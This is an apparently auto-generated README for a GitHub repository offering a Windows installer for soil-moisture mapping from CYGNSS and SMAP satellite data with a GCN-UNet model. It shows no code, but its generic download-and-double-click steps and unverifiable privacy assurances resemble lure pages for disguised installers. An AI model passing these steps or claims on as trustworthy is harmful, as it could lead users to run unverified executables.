# 📡 GNSS-Satellite-Soil-Moisture-Retrieval - Map soil moisture using satellite data

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval)

This software platform processes satellite data to measure moisture levels in soil. It uses deep learning models to convert complex signal data into clear, usable maps. These maps cover a geographic resolution of 9 kilometers. Researchers and land managers use this information to track water content in the ground across large areas.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer. This process takes about ten minutes depending on your internet connection speed.

1. Go to the project download page: [https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval](https://github.com/turbinate-unclesam507/GNSS-Satellite-Soil-Moisture-Retrieval).
2. Locate the section labeled Releases on the right side of the screen.
3. Click the latest version of the installer file.
4. Save the file to your computer.
5. Double-click the file to begin the installation.
6. Follow the instructions on the screen to finish the setup.

## 💻 System Requirements

The software requires a standard Windows 10 or Windows 11 machine. Ensure your computer meets these minimum specifications for smooth performance:

*   Processor: Intel Core i5 or equivalent.
*   Memory: 8 GB of RAM.
*   Storage: 2 GB of available disk space.
*   Graphics: Dedicated graphics card with at least 2 GB of video memory.
*   Network: Stable high-speed internet connection for data retrieval.

## 🛠 Features

The platform includes tools designed for geological data analysis. 

*   Automated Data Inversion: The system converts signals from CYGNSS and SMAP satellites into moisture readings.
*   High Resolution Maps: Users generate soil moisture maps at a 9-kilometer grid density.
*   Model Processing: The software uses GCN-UNet architecture to process complex environmental data.
*   Visual Dashboard: A clean interface displays moisture trends over specific time periods.
*   Data Export: Save your final maps as standard image files for use in reports or presentations.

## ⚙️ How to Use the Software

Once the installation finishes, you will see a shortcut icon on your desktop. Open the application to start your first project.

- Step 1: Select the region of interest using the map tool.
- Step 2: Choose the date range for your moisture analysis.
- Step 3: Click the Process button. The software downloads the necessary data from satellite sources.
- Step 4: Wait for the progress bar to finish. The processing time varies based on the size of the selected area.
- Step 5: View the results on the main screen. The color-coded map indicates high, medium, and low moisture levels.
- Step 6: Use the Save option to export the results as a file on your computer.

## 🔍 Troubleshooting Common Issues

If the software does not work, check these common items.

- Connection Errors: If the application cannot reach the satellite data server, check your firewall or proxy settings. Many corporate networks block data transfers from external research servers.
- Slow Performance: Large map areas require significant computer power. If the program stops responding, select a smaller geographic region for your analysis.
- Update Requirements: Periodically check the GitHub page for new versions. Newer versions often include fixes for bugs or compatibility changes in the Windows operating system.
- Graphics Glitches: Ensure your graphics drivers are current. Outdated drivers can cause blank screens or slow rendering of soil maps.

## 📋 Data Sources

The accuracy of your results depends on the data provided by satellites. This tool integrates information from two main sources.

The CYGNSS system provides data through signals reflected off the surface of the Earth. These signals tell the software how much water is present in the soil. The SMAP system further refines this data. The GCN-UNet model combines these two signals to filter out noise and improve the quality of the final map.

## 💡 Best Practices

For best results, use a wired internet connection during the data download phase. High-speed transfers prevent errors in the underlying data sets. Also, close other intensive programs while running the moisture retrieval process. This ensures the computer devotes its full power to the calculation. 

If you need to analyze multiple regions, do so one at a time. This keeps the application stable and reduces the load on your system memory. You can organize your exported maps into folders based on the date of creation to maintain a clear record of your research over time.

## 🛡 Security and Privacy

This software runs locally on your computer. It does not store your personal information on any external server. All data processing happens on your machine. You decide which maps to export and where to save them. The software only connects to the internet to download public satellite data. It does not upload files from your computer to the internet.